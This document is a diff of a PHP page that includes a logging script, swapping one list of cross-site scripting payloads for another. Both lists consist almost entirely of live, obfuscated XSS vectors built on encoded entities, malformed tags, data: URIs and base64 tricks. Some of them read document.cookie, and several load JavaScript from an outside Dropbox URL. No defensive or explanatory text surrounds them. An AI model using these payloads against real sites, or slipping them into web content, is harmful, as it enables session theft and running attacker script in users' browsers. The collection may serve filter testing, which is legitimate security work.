@@ -2,63 +2,98 @@
 
 include 'log.php';
 
-?><script>alert(123);</script>
-<ScRipT>alert("XSS");</ScRipT>
-<script>alert(123)</script>
-<script>alert("hellox worldss");</script>
-<script>alert(�XSS�)</script> 
-<script>alert(�XSS�);</script>
-<script>alert(�XSS�)</script>
-�><script>alert(�XSS�)</script>
-<script>alert(/XSS�)</script>
-<script>alert(/XSS/)</script>
-</script><script>alert(1)</script>
-�; alert(1);
-�)alert(1);//
-<ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(�XSS�)>
-<IMG SRC=�javascript:alert(�XSS�);�>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(�XSS�)>      
-<img src=xss onerror=alert(1)>
+?></script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
 
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
 
-<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+http://www.google<script .com>alert(document.location)</script
 
-<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
 
-<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
 
-<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
 
-<img/src=`%00` onerror=this.onerror=confirm(1)
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
 
-<form><isindex formaction="javascript&colon;confirm(1)"
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
 
-<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
 
-<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
 
-<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
 
-<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
 
-<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 
-&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<script ~~~>alert(0%0)</script ~~~>
 
-<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
 
-<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
 
-<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
 
-<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
 
-<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
-<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
 
-<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+
+<var onmouseover="prompt(1)">On Mouse Over</var>
+
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+
+<img src="/" =_=" title="onerror='prompt(1)'">
+
+<%<!--'%><script>alert(1);</script -->
+
+<script src="data:text/javascript,alert(1)"></script>
+<iframe/src \/\/onload = prompt(1)
+
+<iframe/onreadystatechange=alert(1)
+
+<svg/onload=alert(1)
+
+<input value=<><iframe/src=javascript:confirm(1)
+
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+
+http://www.<script>alert(1)</script .com
  
  
 <!doctype html>
